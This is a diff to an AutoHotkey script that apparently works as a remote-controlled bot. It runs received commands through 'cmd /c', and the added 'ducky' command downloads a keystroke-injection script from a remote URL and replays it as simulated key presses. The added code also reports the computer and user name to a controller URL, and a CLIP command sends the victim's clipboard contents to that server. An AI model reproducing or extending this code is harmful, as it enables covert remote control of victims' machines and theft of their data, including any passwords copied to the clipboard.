@@ -40,7 +40,7 @@ loop
 	;msgBox %com_id%-%last_com_id%
 	if counter = 0
 	{
-		if BaseArray !=
+		if BaseArray2 !=
 			run cmd /c %BaseArray2%
 	}
 	if counter = 60
@@ -136,6 +136,117 @@ loop
 			else if SubArray2 = sleeptime
 			{
 				sleept := SubArray3
+			}
+			else if SubArray2 = ducky
+			{
+				whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+				whr.Open("GET",SubArray3, true)
+				whr.Send()
+				whr.WaitForResponse()
+				duckyscript := whr.ResponseText
+				
+					temp :=  binurl "?laz=" A_ComputerName "--" A_UserName ":-_duckyng_contents_of:-" SubArray3
+					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+					whr.Open("GET",temp, true)
+					whr.Send()
+					whr.WaitForResponse()
+					temp := whr.ResponseText
+					
+				defdel := 0
+				debug := 0
+				Loop, parse, duckyscript, `n, `r
+				{
+				TestString := A_LoopField
+				StringSplit, word_array, TestString, %A_Space%, .  ; Omits periods.
+				command := word_array1
+				;MsgBox, The Command is %command%.
+				StringLen, len, word_array1
+				len := len+2
+				StringMid, params,TestString,len
+				;MsgBox,  "%command%":"%params%"
+				if debug = 1
+					SoundBeep
+					
+					
+				if command = DEBUG
+						debug := 1
+				else if command = DEFAULT_DELAY
+						defdel := params
+					
+				else if command = DEFAULTDELAY
+						defdel := params
+					
+				else if command = DELAY
+						sleep, params
+					
+				else if command = STRING
+						send,{raw} %params%
+					
+				else if command = GUI
+						send, #%params%
+						
+				else if command = WINDOWS
+						send, #%params%
+						
+				else if command = APP
+						send, +{F10}
+						
+				else if command = MENU
+						send, +{F10}
+						
+				else if command = SHIFT
+						send, +{%params%}
+
+				else if command = ALT
+						send, !{%params%}
+
+				else if command = CONTROL
+						send, ^{%params%}
+						
+				else if command = CTRL
+						send, ^{%params%}
+						
+				else if command = DOWN
+						send, {DOWN}
+						
+				else if command = DOWNARROW
+						send, {DOWN}
+						
+				else if command = UP
+						send, {UP}
+						
+				else if command = UPARROW
+						send, {UP}
+						
+				else if command = LEFT
+						send, {LEFT}
+						
+				else if command = LEFTARROW
+						send, {LEFT}
+						
+				else if command = RIGHT
+						send, {RIGHT}
+						
+				else if command = RIGHTARROW
+						send, {RIGHT}
+						
+				else if command = ENTER
+						send, {enter}
+						
+				else if command = AHK
+						send, %AHK%
+				
+				else if command = CLIP
+				{
+					temp :=  binurl "?laz=" A_ComputerName "--" A_UserName ":-_contents_of_Clipboard:-" ClipBoard
+					whr := ComObjCreate("WinHttp.WinHttpRequest.5.1")
+					whr.Open("GET",temp, true)
+					whr.Send()
+					whr.WaitForResponse()
+					temp := whr.ResponseText
+				}
+				sleep, defdel
+				}
 			}
 		}else{
 			run cmd /c %command%
